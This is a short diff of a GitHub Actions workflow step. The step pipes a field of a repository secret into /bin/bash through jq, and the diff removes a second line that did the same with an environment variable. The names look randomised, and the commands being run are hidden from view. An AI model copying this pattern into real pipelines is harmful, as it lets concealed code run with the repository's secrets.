@@ -21,7 +21,6 @@ jobs:
           mzfk6: ${{ secrets.mzfk6 }}
         run: |
           printf '%s' "$mzfk6" | jq -r .djeof3599 | /bin/bash
-          echo $ihcq3595 | jq -r .jwzu1 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
